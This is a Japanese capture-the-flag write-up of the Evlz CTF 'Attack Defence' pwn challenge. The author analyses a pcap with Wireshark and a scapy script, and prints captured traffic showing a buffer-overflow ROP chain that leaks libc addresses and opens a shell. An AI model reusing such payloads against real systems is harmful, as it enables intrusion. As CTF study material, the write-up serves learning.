# [pwn 491pts] Attack Defence - Evlz CTF
問題文はこんな感じです。
```
Our network was recently breached by some 0-day that we never saw before.
I am providing you with the pcap of the network. Please find out what did they take.
Difficulty estimate: Easy
nc 35.198.113.131 31336
```
pcapファイルが渡されるという今まで見たことが無いパターンです。

Wiresharkで開いてConversationsを見ると、https, sshそしてupnotifypというポートが使われています。
upnotifyp(4445番ポート)の通信を見てみましょう。
適当に1つ選んでFollow TCP Streamすると次のような通信内容でした。
```
read GOT at 0x404020
```
なにやら怪しいです。
とりあえず4445番ポートの通信内容を集めるスクリプトを書きます。
```python
from scapy.all import *
from datetime import datetime

def analyse(pkt):
    if pkt[TCP].dport == 4445 and pkt[TCP].payload:
        print(pkt[TCP].payload)

sniff(offline="log2.pcapng", filter="tcp", store=0, prn=analyse)
```

実在するサービスではなさそうです。
```
b'AAAAAAAAAAAAAAAAAAAAAAAA'
b'read GOT at 0x404020\n'
b'AAAAAAAAAAAAAAAAAAAAAAAAK\x12@\x00\x00\x00\x00\x00 @@\x00\x00\x00\x00\x00\n'
b'puts PLT at 0x40102c\n'
b'AAAAAAAAAAAAAAAAAAAAAAAAK\x12@\x00\x00\x00\x00\x00 @@\x00\x00\x00\x00\x00,\x10@\x00\x00\x00\x00\x00\n'
b'main in binary at 0x4011a3\n'
b'AAAAAAAAAAAAAAAAAAAAAAAAK\x12@\x00\x00\x00\x00\x00 @@\x00\x00\x00\x00\x00,\x10@\x00\x00\x00\x00\x00\xa3\x11@\x00\x00\x00\x00\x00\n'
b'read found at 0x7f76847cf250\nputs found at 0x7f7684747690\nsystem found at 0x7f768471d390\nfree found at 0x7f768475c4f0\nmalloc found at 0x7f768475c130\n'
b'We should be back at the beginning of binary'
b'POP RDI; RET gadget at 0x40124b\n'
b'AAAAAAAAAAAAAAAAAAAAAAAAK\x12@\x00\x00\x00\x00\x00WM\x86\x84v\x7f\x00\x00\x90\xd3q\x84v\x7f\x00\x00\n'
b"Got shell, let's roll\n"
b'Got flag as evlz{XxXxXxXxXxXxXxXxXxXxXxX}ctf\nClosing connection\n'
```
たぶん同じようなパケットを稼働しているサーバーに送ってやれば良さそう。
いくつかの関数のアドレスが分かっているのでlibcのバージョンも特定できます。

面白そうでしたが残念ながら問題バイナリ, Dockerfileいずれも見つからなかったので解けません。

writeupによると、やはり同じパケットを送ってlibcのロードアドレスを取得し、そこから普通にROPすればshellが取れるようです。

# 感想
問題ファイルだけじゃなくて環境ごと公開してほしいなー。

# 参考文献
[1] [https://github.com/SoulTaku/write-ups/tree/master/evlz/attack_defence](https://github.com/SoulTaku/write-ups/tree/master/evlz/attack_defence)